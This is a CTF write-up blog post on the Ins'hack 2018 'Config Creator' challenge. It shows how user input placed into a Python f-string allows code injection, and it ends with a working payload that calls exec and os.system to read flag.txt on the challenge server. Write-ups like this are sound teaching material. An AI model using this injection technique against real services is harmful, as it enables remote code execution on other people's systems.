---
layout: post
title:  "[Ins'hack CTF 2018] Config Creator"
date:   2018-04-08 17:00:00 +0000
categories: "CTF"
comments: true
---

As I'm currently into pwning things, I tried the pwn category at the Ins'hack CTF. And frankly, I really enjoyed spend time on their challenges. The first one was Config Creator. It was supposed to be hard, but had most validations than the other.
> I've just written a small utility to create a config file (which are sooo painful to write by han, right?).

> Care to have a look?

> nc config-creator.ctf.insecurity-insa.fr 10000  

No binary to reverse so let's give it a first shot:
```
Welcome to the config creator!

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 1
Config key? A
Config value? B
Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 3
template:
f"""
configuration [
    A = {A};
]
"""

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 4
config:

configuration [
    A = B;
]


Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 6
Bye
```
Plenty of options... After playing with these, I tried several things but didn't get something until I sent some random hex values:
```
└───▶python -c "print('1\n\xff\n\xff\n3\n4\n6\n')" | nc config-creator.ctf.insecurity-insa.fr 10000
Welcome to the config creator!

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
Config key? Config value?
Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
template:
f"""
configuration [
     = {};
]
"""

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
config:
f-string: empty expression not allowed (<string>, line 5)
An error occurred, sorry

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
Bye
```
See this line ?
> f-string: empty expression not allowed (<string>, line 5)

I didn't know what was that, **f-string**. A quick look at google and I landed on [this article](https://hackernoon.com/a-closer-look-at-how-python-f-strings-work-f197736b3bdb). Apparently this is a new way to format strings. A quick example of this fearture would be:
```python
>>> a=1337
>>> f'Hello {a} ABCD'
'Hello 1337 ABCD'
```
At this point it's almost sure that we'll have to exploit it. Let's try to:
```
└───▶ python -c "print('1\na\nabc\n1\nprint(a)\nprint(a)\n3\n4\n6\n')" | nc config-creator.ctf.insecurity-insa.fr 10000
Welcome to the config creator!

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
Config key? Config value?
Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
Config key? Config value?
Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
template:
f"""
configuration [
    a = {a};
    print(a) = {print(a)};
]
"""

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
config:
abc

configuration [
    a = abc;
    print(a) = None;
]


Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice?
Bye
```
We managed to print the variable a (the 'abc'). It would be great if we could put "import os; os.system(\'cat flag.txt\')" in a variable and execute it. If we look at the python [built-in functions](https://docs.python.org/3/library/functions.html), we find a interesting function **exec**.
> exec(object[, globals[, locals]]) <br/>
> This function supports dynamic execution of Python code. object must be either a string or a code object. If it is a string, the string is parsed as a suite of Python statements which is then executed (unless a syntax error occurs).

Seems perfctly suitable. And yep, we can retrieve the flag with:
```shell
python -c "print('1\na\nimport os; os.system(\'cat flag.txt\')\n1\n' + 'exec(a)\n' + '1\n3\n4\n6\n')" | nc config-creator.ctf.insecurity-insa.fr 10000
```
